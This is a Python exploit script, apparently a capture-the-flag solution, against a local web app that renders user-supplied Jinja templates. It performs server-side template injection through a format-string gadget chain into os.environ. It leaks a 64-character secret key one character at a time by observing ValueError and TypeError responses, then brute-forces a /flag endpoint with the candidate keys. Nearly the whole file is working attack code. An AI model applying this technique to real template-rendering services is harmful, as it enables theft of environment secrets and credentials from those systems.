from itertools import product
import requests
from time import sleep

URL = 'http://127.0.0.1:5000'

def runfmt(fmtstr):
    sleep(0.23)
    template = '{{ namespace(sort=%r.format)|median }}' % fmtstr
    print(template)
    resp = requests.post(f'{URL}/run', data={'template': template})
    return resp.text

def get_key_char(i):
    return 'key.__globals__[__builtins__].quit.__init__.__globals__[sys].modules[os].environ[KEY][%d]' % i

def guess_hex_char(i):
    c = get_key_char(i)
    if 'ValueError' in runfmt('{key.__name__:{%s}}' % c):
        if 'ValueError' not in runfmt('{key.__globals__[__builtins__].quit.__init__.__globals__[sys].modules[_thread].TIMEOUT_MAX:{%s}}' % c):
            return 'ef'
        if 'ValueError' in runfmt('{key.__code__.co_argcount:{%s}}' % c):
            return 'a'
        if 'ValueError' in runfmt('{key.__code__.co_argcount:#{%s}}' % c):
            return 'c'
        if 'ValueError' in runfmt('{key.__code__.co_argcount:,{%s}}' % c):
            return 'b'
        return 'd'
    else:
        if 'TypeError' in runfmt('{key.__code__.co_argcount:.{%s}0000000000g}' % c):
            return '0'
        if 'TypeError' in runfmt('{key.__code__.co_argcount:.2{%s}47483647g}' % c):
            return '1'
        if 'TypeError' in runfmt('{key.__code__.co_argcount:.{%s}147483647g}' % c):
            return '2'
        if 'TypeError' in runfmt('{key.__code__.co_argcount:.214748{%s}647g}' % c):
            return '3'
        if 'TypeError' in runfmt('{key.__code__.co_argcount:.21{%s}7483647g}' % c):
            return '4'
        if 'TypeError' in runfmt('{key.__code__.co_argcount:.2147483{%s}48g}' % c):
            return '5'
        if 'TypeError' in runfmt('{key.__code__.co_argcount:.2147483{%s}47g}' % c):
            return '6'
        if 'TypeError' in runfmt('{key.__code__.co_argcount:.214{%s}483647g}' % c):
            return '7'
        if 'TypeError' in runfmt('{key.__code__.co_argcount:.21474{%s}3647g}' % c):
            return '8'
        return '9'

x = [guess_hex_char(i) for i in range(64)]
print(x)
possible_keys = list(map(''.join, product(*x)))
print(f'Guessing {len(possible_keys)} key(s)...')

for key in possible_keys:
    sleep(0.23)
    flag = requests.post(f'{URL}/flag', data={'key': key}).text
    if flag != 'Invalid key':
        print(flag)
